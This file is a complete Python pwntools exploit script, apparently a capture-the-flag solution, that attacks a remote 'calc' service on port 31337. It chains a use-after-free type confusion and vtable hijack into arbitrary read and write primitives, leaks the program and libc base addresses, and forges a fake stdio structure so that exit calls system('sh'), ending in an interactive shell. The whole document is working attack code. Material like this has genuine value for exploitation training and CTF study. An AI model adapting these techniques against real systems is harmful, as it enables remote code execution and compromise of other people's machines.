#!/usr/bin/env python3

# ./exp.py <IP>

from pwn import *
import sys

r = remote(sys.argv[1], 31337)
elf = ELF("./calc")
libc = ELF("./libc.so")

def new_int_arr(nums):
    r.sendlineafter(b"Choice: ", b"1")
    for n in nums:
        r.sendlineafter(b": ", str(n).encode())

def del_int_arr():
    r.sendlineafter(b"Choice: ", b"2")

def new_calc(num):
    r.sendlineafter(b"Choice: ", b"3")
    r.sendlineafter(": ", str(num).encode())

def del_calc():
    r.sendlineafter(b"Choice: ", b"4")

def do_calc(choice):
    r.sendlineafter(b"Choice: ", b"5")
    r.sendlineafter(b": ", str(choice).encode())

def set_int_arr(nums):
    del_int_arr() # delete int_arr so we can set int_arr with new_int_arr
    new_int_arr(nums)

def aar(vt, addr):
    """
    64 bit arbitrary read
    """
    # leak low 32 bit first
    l32 = vt & 0xffffffff
    h32 = (vt >> 32) & 0xffffffff
    addr_l32 = addr & 0xffffffff
    addr_h32 = (addr >> 32) & 0xffffffff
    nums = [l32, h32, addr_l32, addr_h32, 0, 0]
    set_int_arr(nums)
    do_calc(2) # leak low 32 bit
    r.recvuntil(b"Status: ")
    low32 = int(r.recvline().strip()) & 0xffffffff
    # leak high 32 bit
    nums = [l32, h32, addr_l32+4, addr_h32, 0, 0]
    set_int_arr(nums)
    do_calc(2) # leak high 32 bit
    r.recvuntil(b"Status: ")
    high32 = int(r.recvline().strip()) & 0xffffffff
    data = (high32 << 32) | low32
    return data

def aaw(vt, addr, val, is32=False):
    """
    64/32 bit arbitrary write
    """
    # write low 32 bit
    l32 = vt & 0xffffffff
    h32 = (vt >> 32) & 0xffffffff
    addr_l32 = addr & 0xffffffff
    addr_h32 = (addr >> 32) & 0xffffffff
    nums = [l32, h32, addr_l32, addr_h32, val & 0xffffffff, 0]
    set_int_arr(nums)
    do_calc(1) # write low 32 bit
    if not is32:
        nums = [l32, h32, addr_l32+4, addr_h32, (val >> 32) & 0xffffffff, 0]
        set_int_arr(nums)
        do_calc(1) # write high 32 bit

# create free chunk
new_int_arr([1, 2, 3, 4, 5, 6])
del_int_arr()
# allocate calc so now calc == int_arr
new_calc(-0xaaaa+0xbc+1) # will set int_arr[2] & int_arr[3] cause it's int64_t
# now int_arr: [vtable low 32, vtable high 32, -0xaaaa+0xbc+1, 0xffffffff, 0, 0]
# doing calc->sum() will make vtable become the one that can leak text base ( std::exception )
do_calc(1) # this modify calc's vtable when doing calc->sum()
# now call calc->eor() will call std::exception::what() and leak text base
do_calc(1)

# leak text base
r.recvuntil(b"Status: ")
elf.address = (0xaaaa<<32) |((int(r.recvline().strip()) & 0xffffffff) - 0x57ef)
vt = elf.address + 0xA168 # target vtable for aar/aaw
log.info(f"text base: {hex(elf.address)}")
log.info(f"target vtable: {hex(vt)}")

# do this so aar/aaw can focus on int_arr only
del_calc()
new_int_arr([0, 0, 0, 0, 0, 0])

# leak libc
puts_addr = aar(vt, elf.got.puts)
libc.address = puts_addr - libc.symbols.puts
log.info(f"libc: {hex(libc.address)}")
log.info(f"_libc_stdio_cleanup: {hex(libc.address+0x80DD0)}")

# overwrite &_sglue+0x10 ( __sF ) and hijack control flow during __libc_init -> exit -> _cxa_finalize -> _libc_stdio_cleanup
# pick a buffer to forge our __sF
# Have to pick libc's bss, since we can only overwrite the __sF pointer once ( the low 32 bits ), so the high 32 bits must remain same
buf = libc.address + 0xdd000 - 0x100
# payload, fake __sF
aaw(vt, buf, 0x11) # v6, have to > v5
aaw(vt, buf + 0x10, 0x8008 & 8)
aaw(vt, buf + 0x18, 0x10) # v5
aaw(vt, buf + 0x30, next(elf.search(b"sh\x00"))) # 1st arg
aaw(vt, buf + 0x50, libc.symbols.system) # function pointer

# overwrite __sglue + 0x10 ( __sF ), only overwrite 4 bytes
aaw(vt, libc.address + 0xdc270, buf & 0xffffffff, is32=True)

# exit and trigger system("sh")
r.sendlineafter("Choice: ", b"6")

r.interactive()
